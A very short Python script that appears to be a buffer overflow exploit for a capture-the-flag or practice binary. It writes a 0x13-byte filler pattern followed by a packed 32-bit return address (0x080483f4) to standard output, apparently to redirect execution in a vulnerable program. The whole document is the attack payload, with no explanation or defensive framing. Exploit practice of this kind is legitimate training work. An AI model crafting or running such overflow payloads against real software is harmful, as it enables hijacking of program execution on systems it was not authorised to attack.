#!/usr/bin/env python3
import sys
import struct
from pwnpy.pwn import *

buf = create_pattern(0x13)
buf += struct.pack('I', 0x080483f4)
buf += b'\n'

sys.stdout.buffer.write(buf)
sys.stdout.flush()
